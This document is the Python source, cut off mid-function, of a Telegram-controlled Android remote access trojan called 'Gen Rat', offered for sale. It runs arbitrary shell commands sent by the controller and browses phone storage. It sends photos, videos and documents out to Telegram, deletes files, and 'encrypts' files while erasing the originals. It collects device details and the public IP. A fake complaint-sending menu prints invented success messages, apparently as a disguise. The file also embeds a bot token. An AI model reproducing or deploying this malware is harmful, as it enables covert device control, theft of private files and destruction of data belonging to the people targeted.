import os
import shutil
import random
import threading
import time
import json
import subprocess
import requests
import psutil
import platform
import base64
import hashlib
from datetime import datetime
from telebot import TeleBot, types
from colorama import Fore, Style, init

init()

TOKEN = '7900082051:AAEqlb8aY_KiVIuoqOJ9Ko4w9ThjJlKilzU'
ADMIN_ID = 8447477044

bot = TeleBot(TOKEN)

ROOT = '/storage/emulated/0/'

active_devices = {}
device_selections = {}
user_uploads = {}

def get_device_info(user_id):
    try:
        info = {}
        
        try:
            output = subprocess.check_output(["getprop"], text=True, timeout=3)
            props = {}
            for line in output.splitlines():
                if "[" in line and "]" in line:
                    try:
                        key = line.split("[")[1].split("]")[0]
                        val = line.split("[")[2].split("]")[0].strip()
                        props[key] = val
                    except:
                        continue
            
            brand = props.get("ro.product.brand", "Unknown")
            model = props.get("ro.product.model", "Unknown")
            device = props.get("ro.product.device", "Unknown")
            manufacturer = props.get("ro.product.manufacturer", brand)
            android_ver = props.get("ro.build.version.release", "Unknown")
            
            info['brand'] = brand
            info['model'] = model
            info['device'] = device
            info['manufacturer'] = manufacturer
            info['android'] = android_ver
            info['name'] = f"{brand} {model}"
        except:
            info['name'] = f"Device_{random.randint(1000, 9999)}"
        
        info['ip'] = "Unknown"
        try:
            result = subprocess.run(['curl', '-s', 'http://ip-api.com/json/'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                ip_info = json.loads(result.stdout)
                info['ip'] = ip_info.get('query', 'Unknown')
        except:
            pass
        
        info['last_seen'] = datetime.now().strftime('%H:%M')
        info['online'] = True
        info['user_id'] = user_id
        info['unique_id'] = f"{user_id}_{int(time.time())}"
        
        return info
    except Exception as e:
        print(f"Error getting device info: {e}")
        return {"name": f"Device_{random.randint(1000, 9999)}", "last_seen": datetime.now().strftime('%H:%M'), "online": True, "user_id": user_id}

def register_device(user_id, device_info):
    try:
        device_id = device_info['unique_id']
        
        for existing_id, existing_info in list(active_devices.items()):
            if existing_info['user_id'] == user_id:
                existing_info.update(device_info)
                existing_info['last_seen'] = datetime.now().strftime('%H:%M')
                existing_info['online'] = True
                return existing_id
        
        active_devices[device_id] = device_info
        return device_id
    except Exception as e:
        print(f"Error registering device: {e}")
        return f"error_{user_id}_{int(time.time())}"

def cleanup_old_devices():
    try:
        current_time = time.time()
        to_remove = []
        
        for device_id, device_info in active_devices.items():
            last_seen_str = device_info.get('last_seen', '00:00')
            try:
                last_hour, last_minute = map(int, last_seen_str.split(':'))
                now_hour, now_minute = map(int, datetime.now().strftime('%H:%M').split(':'))
                
                time_diff = (now_hour * 60 + now_minute) - (last_hour * 60 + last_minute)
                if time_diff < 0:
                    time_diff += 24 * 60
                
                if time_diff > 30:
                    to_remove.append(device_id)
            except:
                to_remove.append(device_id)
        
        for device_id in to_remove:
            del active_devices[device_id]
            for user_id in list(device_selections.keys()):
                if device_selections.get(user_id) == device_id:
                    del device_selections[user_id]
    except Exception as e:
        print(f"Error cleaning up old devices: {e}")

def install_needed():
    for pkg in ['telebot', 'colorama', 'requests']:
        try:
            __import__(pkg)
        except ImportError:
            os.system(f'pip install {pkg} --quiet 2>/dev/null')

install_needed()

def count_media(path, exts):
    total = 0
    for root, _, files in os.walk(path):
        total += sum(1 for f in files if any(f.lower().endswith(e) for e in exts))
    return total

def get_file_time_info(filepath):
    try:
        stat_info = os.stat(filepath)
        
        created = datetime.fromtimestamp(stat_info.st_ctime)
        modified = datetime.fromtimestamp(stat_info.st_mtime)
        accessed = datetime.fromtimestamp(stat_info.st_atime)
        
        return {
            'created': created.strftime('%Y-%m-%d %H:%M:%S'),
            'modified': modified.strftime('%Y-%m-%d %H:%M:%S'),
            'accessed': accessed.strftime('%Y-%m-%d %H:%M:%S'),
            'size': stat_info.st_size
        }
    except:
        return None

def send_media(chat_id, path, exts, limit, media_type='photo'):
    sent = 0
    for root, _, files in os.walk(path):
        random.shuffle(files)
        for file in files:
            if sent >= limit:
                return
            if any(file.lower().endswith(e) for e in exts):
                try:
                    full = os.path.join(root, file)
                    
                    file_info = get_file_time_info(full)
                    caption = f"📄 {file}\n"
                    caption += f"📁 Путь: {full}\n"
                    if file_info:
                        caption += f"📅 Создан: {file_info['created']}\n"
                        caption += f"✏️ Изменен: {file_info['modified']}\n"
                        caption += f"📏 Размер: {file_info['size'] / 1024:.1f} KB"
                    
                    with open(full, 'rb') as f:
                        if media_type == 'photo':
                            bot.send_photo(chat_id, f, caption=caption[:1024])
                        elif media_type == 'video':
                            bot.send_video(chat_id, f, caption=caption[:1024])
                        elif media_type == 'document':
                            bot.send_document(chat_id, f, caption=caption[:1024], visible_file_name=file)
                    sent += 1
                except Exception as e:
                    print(f"Error sending file {file}: {e}")
                    pass

def encrypt_file_base64(filepath):
    try:
        with open(filepath, 'rb') as f:
            original_data = f.read()
        
        encrypted_data = base64.b64encode(original_data)
        
        encrypted_path = filepath + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        os.remove(filepath)
        return encrypted_path, True
    except Exception as e:
        return str(e), False

def decrypt_file_base64(filepath):
    try:
        if not filepath.endswith('.enc'):
            return "Файл не имеет расширения .enc", False
        
        with open(filepath, 'rb') as f:
            encrypted_data = f.read()
        
        decrypted_data = base64.b64decode(encrypted_data)
        
        original_path = filepath[:-4] if filepath.endswith('.enc') else filepath
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
        os.remove(filepath)
        return original_path, True
    except Exception as e:
        return str(e), False

def shorten_path(path):
    if len(path) > 40:
        return '...' + path[-37:]
    return path

def hash_path(path):
    return hashlib.md5(path.encode()).hexdigest()[:16]

path_cache = {}

mm = rf"""
{Fore.BLUE}
 ██▓███   ▄▄▄       ██▓    ▄▄▄       ███▄ ▄███▓     ██████  ███▄    █  ▒█████    ██████ 
▓██░  ██▒▒████▄    ▓██▒   ▒████▄    ▓██▒▀█▀ ██▒   ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▒██    ▒ 
▓██░ ██▓▒▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▓██    ▓██░   ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒░ ▓██▄   
{Fore.BLUE}▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██    ▒██      ▒   ██▒▓██▒  ▐▌██▒▒██   ██░  ▒   ██▒
▒██▒ ░  ░ ▓█   ▓██▒░██████▒▓█   ▓██▒▒██▒   ░██▒   ▒██████▒▒▒██░   ▓██░░ ████▓▒░▒██████▒▒
{Fore.BLUE}▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░▒ ░       ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░░  ░      ░   ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
{Fore.BLUE}░░         ░   ▒     ░ ░    ░   ▒   ░      ░      ░  ░  ░      ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░  
               ░  ░    ░  ░     ░  ░       ░            ░           ░     ░ ░        ░  
{Fore.BLUE}                                                                                        
{Style.RESET_ALL}"""

mt = rf"""
{Fore.WHITE}╔════════════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
{Fore.WHITE}║                     Создатель: @VansCodes     Price 5$                    ║{Style.RESET_ALL}
{Fore.WHITE}╠════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}
{Fore.WHITE}║ [01] Мошенничество   [06] Канал     [11] Угрозы          [16] Тролинг  ║{Style.RESET_ALL}
{Fore.WHITE}║ [02] Спам            [07] Обичный   [12] Наркотики       [17] Вирт     ║{Style.RESET_ALL}
{Fore.WHITE}║ [03] Фишинг          [08] Сессия    [13] Религия         [18] Премиум  ║{Style.RESET_ALL}
{Fore.WHITE}║ [04] Спамер          [09] Группа    [14] Домогательство  [19] Бот      ║{Style.RESET_ALL}
{Fore.WHITE}║ [05] Дианон          [10] Насилие   [15] Контент 18+     [20] Выход    ║{Style.RESET_ALL}
{Fore.WHITE}╚════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def fake_console():
    while True:
        try:
            choice = input("Введите число от 1 до 19 (20 для выхода): ")
            if choice == '20':
                break
            
            num_complaints = int(choice)
            if num_complaints < 1 or num_complaints > 19:
                print("Пожалуйста, введите корректное число от 1 до 19. ❌")
                continue

            user_id = input("Введите ID пользователя: ")
            num_complaints = int(input("Введите количество жалоб: "))
            number = input("Введите номер телефона аккаунта жертвы: ")

            for _ in range(num_complaints):
                if random.randint(1, 100) == 1:
                    print(f"{Fore.BLUE}Ошибка при отправке жалобы{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}Жалоба успешно отправлена{Style.RESET_ALL}")
                time.sleep(random.uniform(3, 10))
        except (ValueError, KeyboardInterrupt):
            print("Неверный ввод. Попробуйте снова.")
            continue

user_settings = {}
file_selections = {}

@bot.message_handler(commands=['start'])
def start(message):
    try:
        user_id = message.from_user.id
        cleanup_old_devices()
        
        device_info = get_device_info(user_id)
        device_id = register_device(user_id, device_info)
        
        if user_id not in user_settings:
            user_settings[user_id] = {"last_menu_id": None, "device_id": device_id}
        else:
            user_settings[user_id]["device_id"] = device_id
        
        device_selections[user_id] = device_id
        
        show_devices_menu(message)
    except Exception as e:
        print(f"Error in start command: {e}")
        try:
            bot.send_message(message.chat.id, "Произошла ошибка. Попробуйте еще раз.")
        except:
            pass

def show_devices_menu(message):
    try:
        user_id = message.from_user.id
        cleanup_old_devices()
        
        text = "📱 <b>Выберите устройство:</b>\n──────────────────────────────"
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        
        user_device_ids = []
        for device_id, device_info in active_devices.items():
            if device_info.get('user_id') == user_id:
                user_device_ids.append(device_id)
        
        for device_id in user_device_ids:
            if device_id in active_devices:
                device_info = active_devices[device_id]
                device_name = device_info.get('name', 'Unknown Device')
                last_seen = device_info.get('last_seen', 'Unknown')
                online = "🟢" if device_info.get('online', False) else "🔴"
                
                btn_text = f"{online} {device_name} ({last_seen})"
                markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"select_device_{device_id}"))
        
        if not user_device_ids:
            device_info = get_device_info(user_id)
            device_id = register_device(user_id, device_info)
            device_name = device_info.get('name', 'Unknown Device')
            markup.add(types.InlineKeyboardButton(f"🟢 {device_name} (текущее)", callback_data=f"select_device_{device_id}"))
        
        markup.add(types.InlineKeyboardButton("🔄 Обновить список", callback_data="refresh_devices"))
        markup.add(types.InlineKeyboardButton("🚀 Использовать текущее", callback_data="use_current"))
        
        sent = bot.send_message(
            message.chat.id,
            text,
            parse_mode="HTML",
            reply_markup=markup
        )
        
        if user_id in user_settings:
            user_settings[user_id]["last_menu_id"] = sent.message_id
    except Exception as e:
        print(f"Error showing devices menu: {e}")
        try:
            bot.send_message(message.chat.id, "Ошибка при отображении меню устройств")
        except:
            pass

def show_main_menu(message, device_id=None):
    try:
        user_id = message.from_user.id
        
        if device_id and device_id in active_devices:
            device_info = active_devices[device_id]
            device_name = device_info.get('name', 'Unknown Device')
            text = f"📱 <b>Управление: {device_name}</b>\n──────────────────────────────\nВыберите категорию функций:"
        else:
            text = "✦ <b>Gen Rat • Полный контроль</b> ✦\n──────────────────────────────\nВыберите категорию функций:"
        
        markup = types.InlineKeyboardMarkup(row_width=3)
        markup.row(
            types.InlineKeyboardButton("📁 Файлы", callback_data="tab_files"),
            types.InlineKeyboardButton("🛠 Инструменты", callback_data="tab_tools")
        )
        
        if len(active_devices) > 1 or True:
            markup.add(types.InlineKeyboardButton("📱 Сменить устройство", callback_data="change_device"))
        
        sent = bot.send_message(
            message.chat.id,
            text,
            parse_mode="HTML",
            reply_markup=markup
        )
        
        if user_id in user_settings:
            user_settings[user_id]["last_menu_id"] = sent.message_id
    except Exception as e:
        print(f"Error showing main menu: {e}")
        try:
            bot.send_message(message.chat.id, "Ошибка при отображении меню")
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("select_device_"))
def select_device(call):
    try:
        user_id = call.from_user.id
        device_id = call.data.replace("select_device_", "")
        
        if device_id in active_devices:
            device_selections[user_id] = device_id
            
            device_info = active_devices[device_id]
            device_name = device_info.get('name', 'Unknown Device')
            
            bot.answer_callback_query(call.id, f"Выбрано: {device_name}")
            show_main_menu(call.message, device_id)
        else:
            bot.answer_callback_query(call.id, "Устройство не найдено")
            show_devices_menu(call.message)
    except Exception as e:
        print(f"Error selecting device: {e}")
        bot.answer_callback_query(call.id, "Ошибка выбора устройства")

@bot.callback_query_handler(func=lambda call: call.data == "refresh_devices")
def refresh_devices(call):
    try:
        cleanup_old_devices()
        show_devices_menu(call.message)
    except Exception as e:
        print(f"Error refreshing devices: {e}")
        bot.answer_callback_query(call.id, "Ошибка обновления")

@bot.callback_query_handler(func=lambda call: call.data == "use_current")
def use_current_device(call):
    try:
        user_id = call.from_user.id
        device_info = get_device_info(user_id)
        device_id = register_device(user_id, device_info)
        
        device_selections[user_id] = device_id
        bot.answer_callback_query(call.id, "Текущее устройство выбрано")
        show_main_menu(call.message, device_id)
    except Exception as e:
        print(f"Error using current device: {e}")
        bot.answer_callback_query(call.id, "Ошибка")

@bot.callback_query_handler(func=lambda call: call.data == "change_device")
def change_device(call):
    try:
        show_devices_menu(call.message)
    except Exception as e:
        print(f"Error changing device: {e}")
        bot.answer_callback_query(call.id, "Ошибка")

def get_user_device(user_id):
    try:
        if user_id in device_selections:
            return device_selections[user_id]
        elif user_id in user_settings and "device_id" in user_settings[user_id]:
            return user_settings[user_id]["device_id"]
        return None
    except:
        return None

@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main(call):
    try:
        user_id = call.from_user.id
        
        device_id = get_user_device(user_id)
        if device_id:
            show_main_menu(call.message, device_id)
        else:
            show_main_menu(call.message)
    except Exception as e:
        print(f"Error in back_to_main: {e}")
        try:
            bot.send_message(call.message.chat.id, "Ошибка при возврате в меню")
        except:
            pass

@bot.callback_query_handler(func=lambda c: c.data == "terminal")
def terminal_menu(call):
    try:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("Выполнить команду", callback_data="exec_cmd"))
        keyboard.add(types.InlineKeyboardButton("← Назад", callback_data="back_to_main"))
        
        bot.edit_message_text(
            "Терминал устройства\n\nМожно выполнять любые shell-команды (su не требуется)",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Error in terminal_menu: {e}")

@bot.callback_query_handler(func=lambda c: c.data == "exec_cmd")
def ask_command(call):
    try:
        bot.edit_message_text(
            "Введите команду для выполнения на устройстве:",
            call.message.chat.id,
            call.message.message_id
        )
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, process_command)
    except Exception as e:
        print(f"Error in ask_command: {e}")

def process_command(message):
    try:
        cmd = message.text.strip()
        result = subprocess.run(cmd, shell=True, text=True, capture_output=True, timeout=25)
        output = result.stdout + result.stderr
        if len(output) > 3800:
            output = output[:3800] + "\n... (вывод обрезан)"
        if not output.strip():
            output = "(команда выполнена без вывода)"
        bot.reply_to(message, f"Результат выполнения:\n\n{cmd}\n\n{output}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка выполнения:\n{str(e)}")

def show_filesystem_menu(chat_id, path=ROOT, page=0, msg_id=None, selected_file_hash=None, is_upload=False):
    try:
        ITEMS = 8
        try:
            items = sorted(os.listdir(path))
        except:
            items = []

        dirs = [d for d in items if os.path.isdir(os.path.join(path, d))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]

        all_items = dirs + files
        start = page * ITEMS
        show_items = all_items[start:start+ITEMS]

        keyboard = types.InlineKeyboardMarkup(row_width=2)

        for item in show_items:
            full_path = os.path.join(path, item)
            path_hash = hash_path(full_path)
            path_cache[path_hash] = full_path
            
            prefix = '📁' if os.path.isdir(full_path) else '📄'
            if item.lower().endswith(('.jpg','.png','.jpeg','.gif','.webp')): prefix = '🖼️'
            elif item.lower().endswith(('.mp4','.mkv','.avi','.3gp','.mov')): prefix = '🎥'
            elif item.lower().endswith('.enc'): prefix = '🔒'
            
            if is_upload:
                callback_data = f"ufld_{path_hash}"
            elif selected_file_hash is None:
                callback_data = f"sel_{path_hash}"
            else:
                callback_data = f"mov_{selected_file_hash}_{path_hash}"
            
            if len(callback_data) > 64:
                callback_data = callback_data[:64]
            
            display_name = item[:20] + "..." if len(item) > 20 else item
            keyboard.add(types.InlineKeyboardButton(f"{prefix} {display_name}", callback_data=callback_data))

        nav = []
        if page > 0:
            nav.append(types.InlineKeyboardButton("⬅️", callback_data=f"pag_{hash_path(path)}_{page-1}_{'1' if is_upload else '0'}"))
        if start + ITEMS < len(all_items):
            nav.append(types.InlineKeyboardButton("➡️", callback_data=f"pag_{hash_path(path)}_{page+1}_{'1' if is_upload else '0'}"))
        if nav:
            keyboard.row(*nav)

        if is_upload:
            keyboard.row(
                types.InlineKeyboardButton("↑ Вверх", callback_data=f"upup_{hash_path(path)}"),
                types.InlineKeyboardButton("📤 Загрузить сюда", callback_data=f"uplc_{hash_path(path)}"),
                types.InlineKeyboardButton("❌ Отмена", callback_data="tab_files")
            )
        elif selected_file_hash is None:
            keyboard.row(
                types.InlineKeyboardButton("↑ Вверх", callback_data=f"up_{hash_path(path)}"),
                types.InlineKeyboardButton("« Назад", callback_data="back_to_main")
            )
        else:
            keyboard.row(
                types.InlineKeyboardButton("❌ Отмена", callback_data=f"dir_{hash_path(path)}"),
                types.InlineKeyboardButton("📁 Сюда", callback_data=f"mto_{selected_file_hash}_{hash_path(path)}")
            )

        text = f"Текущая папка: {shorten_path(path)}\nСтраница {page+1}"
        
        if selected_file_hash and selected_file_hash in path_cache:
            filename = os.path.basename(path_cache[selected_file_hash])
            text = f"Выбран файл: {filename}\nКуда переместить?\n\nТекущая папка: {shorten_path(path)}"
        elif is_upload:
            text = f"📤 Выберите папку для загрузки файла:\n\nТекущая папка: {shorten_path(path)}\nСтраница {page+1}"

        if msg_id:
            bot.edit_message_text(text, chat_id, msg_id, reply_markup=keyboard)
        else:
            bot.send_message(chat_id, text, reply_markup=keyboard)
    except Exception as e:
        print(f"Error showing filesystem menu: {e}")
        try:
            bot.send_message(chat_id, "Ошибка при отображении файлов")
        except:
            pass

def show_file_actions(chat_id, filepath, msg_id):
    try:
        filename = os.path.basename(filepath)
        file_hash = hash_path(filepath)
        path_cache[file_hash] = filepath
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        
        if os.path.isdir(filepath):
            keyboard.row(
                types.InlineKeyboardButton("📂 Открыть папку", callback_data=f"dir_{file_hash}"),
                types.InlineKeyboardButton("🗑️ Удалить папку", callback_data=f"cdel_{file_hash}")
            )
            keyboard.row(
                types.InlineKeyboardButton("📦 Заархивировать", callback_data=f"zip_{file_hash}"),
                types.InlineKeyboardButton("📤 Загрузить файл", callback_data=f"upfl_{file_hash}")
            )
            keyboard.row(
                types.InlineKeyboardButton("↩️ Назад к файлам", callback_data=f"dir_{hash_path(os.path.dirname(filepath))}")
            )
            text = f"Папка: {filename}\nВыберите действие:"
        else:
            if filepath.endswith('.enc'):
                keyboard.row(
                    types.InlineKeyboardButton("📥 Скачать", callback_data=f"fil_{file_hash}"),
                    types.InlineKeyboardButton("🔓 Расшифровать", callback_data=f"dec_{file_hash}")
                )
            else:
                keyboard.row(
                    types.InlineKeyboardButton("📥 Скачать", callback_data=f"fil_{file_hash}"),
                    types.InlineKeyboardButton("🗑️ Удалить", callback_data=f"cdel_{file_hash}")
                )
                keyboard.row(
                    types.InlineKeyboardButton("🔐 Зашифровать", callback_data=f"enc_{file_hash}"),
                    types.InlineKeyboardButton("📦 Переместить", callback_data=f"movs_{file_hash}")
                )
            
            keyboard.row(
                types.InlineKeyboardButton("📋 Копировать путь", callback_data=f"cpy_{file_hash}"),
                types.InlineKeyboardButton("↩️ Назад к файлам", callback_data=f"dir_{hash_path(os.path.dirname(filepath))}")
            )
            
            try:
                file_info = get_file_time_info(filepath)
                text = f"Файл: {filename}\n"
                if file_info:
                    text += f"📅 Создан: {file_info['created']}\n"
                    text += f"✏️ Изменен: {file_info['modified']}\n"
                    text += f"📏 Размер: {file_info['size'] / 1024:.1f} KB\n"
                text += "Выберите действие:"
            except:
                text = f"Файл: {filename}\nВыберите действие:"

        bot.edit_message_text(text, chat_id, msg_id, reply_markup=keyboard)
    except:
        try:
            bot.send_message(chat_id, text, reply_markup=keyboard)
        except Exception as e:
            print(f"Error showing file actions: {e}")

@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
def handle_uploaded_file(message):
    try:
        user_id = message.from_user.id
        
        if user_id not in user_uploads or not user_uploads[user_id].get("awaiting_file", False):
            return
        
        upload_info = user_uploads[user_id]
        upload_path = upload_info.get("upload_path", ROOT)
        
        file_info = None
        file_name = ""
        
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            file_name = message.document.file_name or f"file_{int(time.time())}.dat"
        elif message.photo:
            file_info = bot.get_file(message.photo[-1].file_id)
            file_name = f"img_{int(time.time())}.jpg"
        elif message.video:
            file_info = bot.get_file(message.video.file_id)
            file_name = f"vid_{int(time.time())}.mp4"
        elif message.audio:
            file_info = bot.get_file(message.audio.file_id)
            file_name = f"audio_{int(time.time())}.mp3"
        
        if file_info:
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_path = os.path.join(upload_path, file_name)
            
            counter = 1
            base_name, ext = os.path.splitext(file_name)
            while os.path.exists(file_path):
                file_name = f"{base_name}_{counter}{ext}"
                file_path = os.path.join(upload_path, file_name)
                counter += 1
            
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            file_time_info = get_file_time_info(file_path)
            file_size = len(downloaded_file) / 1024
            
            response_text = f"✅ Файл успешно загружен!\n\n📄 Имя: {file_name}\n"
            response_text += f"📁 Путь: {file_path}\n"
            response_text += f"📏 Размер: {file_size:.1f} KB\n"
            
            if file_time_info:
                response_text += f"📅 Создан: {file_time_info['created']}\n"
                response_text += f"✏️ Изменен: {file_time_info['modified']}\n"
            
            bot.send_message(
                message.chat.id,
                response_text,
                parse_mode="HTML"
            )
        else:
            bot.send_message(message.chat.id, "❌ Не удалось получить файл")
    
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка загрузки: {str(e)[:100]}")
    
    if user_id in user_uploads:
        del user_uploads[user_id]

@bot.callback_query_handler(func=lambda c: True)
def callback_router(call):
    cid = call.message.chat.id
    mid = call.message.message_id
    data = call.data

    try:
        if data == "back_to_main":
            user_id = call.from_user.id
            device_id = get_user_device(user_id)
            if device_id:
                show_main_menu(call.message, device_id)
            else:
                show_main_menu(call.message)

        elif data == "fs_browser":
            show_filesystem_menu(cid)

        elif data.startswith("sel_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                show_file_actions(cid, path_cache[file_hash], mid)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("upfl_"):
            file_hash = data[5:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                if os.path.isdir(path):
                    user_id = call.from_user.id
                    if user_id not in user_uploads:
                        user_uploads[user_id] = {}
                    user_uploads[user_id]["awaiting_file"] = True
                    user_uploads[user_id]["upload_path"] = path
                    
                    bot.edit_message_text(
                        f"📤 <b>Загрузка файла</b>\n──────────────────────────────\nПапка назначения: {shorten_path(path)}\n\nОтправьте файл для загрузки на устройство.",
                        cid,
                        mid,
                        parse_mode="HTML"
                    )
                else:
                    bot.answer_callback_query(call.id, "Выберите папку", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Папка не найдена", show_alert=True)

        elif data.startswith("ufld_"):
            file_hash = data[5:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                if os.path.isdir(path):
                    show_filesystem_menu(cid, path, 0, mid, None, True)
                else:
                    bot.answer_callback_query(call.id, "Выберите папку", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Папка не найдена", show_alert=True)

        elif data.startswith("uplc_"):
            file_hash = data[5:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                if os.path.isdir(path):
                    user_id = call.from_user.id
                    user_uploads[user_id] = {"awaiting_file": True, "upload_path": path}
                    
                    bot.edit_message_text(
                        f"📤 <b>Загрузка файла</b>\n──────────────────────────────\nПапка назначения: {shorten_path(path)}\n\nОтправьте файл для загрузки на устройство.",
                        cid,
                        mid,
                        parse_mode="HTML"
                    )
                else:
                    bot.answer_callback_query(call.id, "Выберите папку", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Папка не найдена", show_alert=True)

        elif data.startswith("upup_"):
            file_hash = data[5:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                parent = os.path.dirname(path.rstrip('/'))
                if not parent or parent == '/':
                    parent = ROOT
                show_filesystem_menu(cid, parent, 0, mid, None, True)
            else:
                bot.answer_callback_query(call.id, "Путь не найден", show_alert=True)

        elif data.startswith("pag_"):
            parts = data.split("_", 3)
            if len(parts) >= 4:
                path_hash = parts[1]
                page = int(parts[2])
                is_upload = parts[3] == "1"
                if path_hash in path_cache:
                    show_filesystem_menu(cid, path_cache[path_hash], page, mid, None, is_upload)
                else:
                    show_filesystem_menu(cid, ROOT, page, mid, None, is_upload)

        elif data.startswith("dir_"):
            path_hash = data[4:]
            if path_hash in path_cache:
                show_filesystem_menu(cid, path_cache[path_hash], 0, mid)
            else:
                show_filesystem_menu(cid, ROOT, 0, mid)

        elif data.startswith("fil_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                try:
                    file_info = get_file_time_info(path)
                    caption = f"📄 {os.path.basename(path)}\n"
                    caption += f"📁 Путь: {path}\n"
                    if file_info:
                        caption += f"📅 Создан: {file_info['created']}\n"
                        caption += f"✏️ Изменен: {file_info['modified']}\n"
                        caption += f"📏 Размер: {file_info['size'] / 1024:.1f} KB"
                    
                    with open(path, 'rb') as f:
                        ext = path.lower()
                        filename = os.path.basename(path)
                        if any(ext.endswith(e) for e in ['.jpg','.jpeg','.png','.gif','.webp']):
                            bot.send_photo(cid, f, caption=caption[:1024])
                        elif any(ext.endswith(e) for e in ['.mp4','.mkv','.avi','.3gp','.mov']):
                            bot.send_video(cid, f, caption=caption[:1024])
                        else:
                            bot.send_document(cid, f, caption=caption[:1024], visible_file_name=filename)
                except Exception as e:
                    bot.answer_callback_query(call.id, f"Ошибка: {str(e)[:30]}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("up_"):
            path_hash = data[3:]
            if path_hash in path_cache:
                current_path = path_cache[path_hash]
                parent = os.path.dirname(current_path.rstrip('/'))
                if not parent or parent == '/':
                    parent = ROOT
                show_filesystem_menu(cid, parent, 0, mid)

        elif data.startswith("cdel_"):
            file_hash = data[5:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                keyboard = types.InlineKeyboardMarkup(row_width=2)
                keyboard.row(
                    types.InlineKeyboardButton("✅ Да, удалить", callback_data=f"del_{file_hash}"),
                    types.InlineKeyboardButton("❌ Нет, отмена", callback_data=f"sel_{file_hash}")
                )
                
                filename = os.path.basename(path)
                if os.path.isdir(path):
                    text = f"Удалить папку '{filename}' и всё её содержимое?"
                else:
                    text = f"Удалить файл '{filename}'?"
                
                try:
                    bot.edit_message_text(text, cid, mid, reply_markup=keyboard)
                except:
                    bot.send_message(cid, text, reply_markup=keyboard)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("del_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                try:
                    if os.path.isdir(path):
                        shutil.rmtree(path, ignore_errors=True)
                        bot.answer_callback_query(call.id, "Папка удалена")
                    else:
                        os.remove(path)
                        bot.answer_callback_query(call.id, "Файл удален")
                    
                    parent_dir = os.path.dirname(path)
                    show_filesystem_menu(cid, parent_dir, 0, mid)
                except Exception as e:
                    bot.answer_callback_query(call.id, f"Ошибка: {str(e)[:30]}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("enc_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                result, success = encrypt_file_base64(path)
                
                if success:
                    bot.answer_callback_query(call.id, "Файл зашифрован")
                    parent_dir = os.path.dirname(path)
                    show_filesystem_menu(cid, parent_dir, 0, mid)
                else:
                    bot.answer_callback_query(call.id, f"Ошибка: {result[:30]}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("dec_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                result, success = decrypt_file_base64(path)
                
                if success:
                    bot.answer_callback_query(call.id, "Файл расшифрован")
                    parent_dir = os.path.dirname(path)
                    show_filesystem_menu(cid, parent_dir, 0, mid)
                else:
                    bot.answer_callback_query(call.id, f"Ошибка: {result[:30]}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("movs_"):
            file_hash = data[5:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                parent_dir = os.path.dirname(path)
                show_filesystem_menu(cid, parent_dir, 0, mid, file_hash)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("mov_"):
            parts = data.split("_", 2)
            if len(parts) == 3:
                selected_hash = parts[1]
                target_hash = parts[2]
                
                if selected_hash in path_cache and target_hash in path_cache:
                    selected_path = path_cache[selected_hash]
                    target_path = path_cache[target_hash]
                    
                    if os.path.isdir(target_path):
                        show_filesystem_menu(cid, target_path, 0, mid, selected_hash)
                    else:
